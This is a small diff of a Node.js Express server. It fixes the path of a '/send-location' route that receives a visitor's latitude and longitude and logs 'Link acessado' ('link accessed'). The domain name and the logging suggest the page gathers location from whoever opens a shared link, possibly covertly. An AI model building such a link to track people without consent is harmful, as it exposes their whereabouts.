@@ -9,13 +9,15 @@ app.use(cors());
 app.use(bodyParser.json());
 const path = require("path");
 
+app.use(express.static(__dirname + '/public'));
+
 app.get("/", (req, res) => {
   res.sendFile(path.join(__dirname, "index.html"));
 });
 
-app.post("https://docspessoais.vercel.app/send-location", async (req, res) => {
+app.post("/send-location", async (req, res) => {
   const { latitude, longitude } = req.body;
-
+  console.log('Link acessado')
   const data = new Date();
   const opcoes = {
     timeZone: "America/Sao_Paulo",
